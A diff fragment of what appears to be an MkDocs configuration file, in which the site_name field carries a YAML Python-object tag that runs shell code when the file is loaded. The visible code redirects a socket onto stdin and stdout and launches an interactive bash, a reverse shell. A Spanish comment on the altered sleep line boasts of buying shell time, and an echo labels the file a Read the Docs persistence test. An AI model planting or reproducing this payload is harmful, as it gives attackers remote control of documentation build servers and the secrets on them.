@@ -10,13 +10,14 @@ site_name: !!python/object/apply:subprocess.getoutput
                 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
                 subprocess.call(["/bin/bash","-i"])
             except: pass
-    time.sleep(60) # <--- ESTO COMPRA 1 MINUTO DE SHELL
+    time.sleep(120) # <--- ESTO COMPRA 1 MINUTO DE SHELL
     '
     echo "RTD-Persistence-Test"
 plugins:
   - search
 markdown_extensions:
   - pymdownx.snippets
+
 
 
 
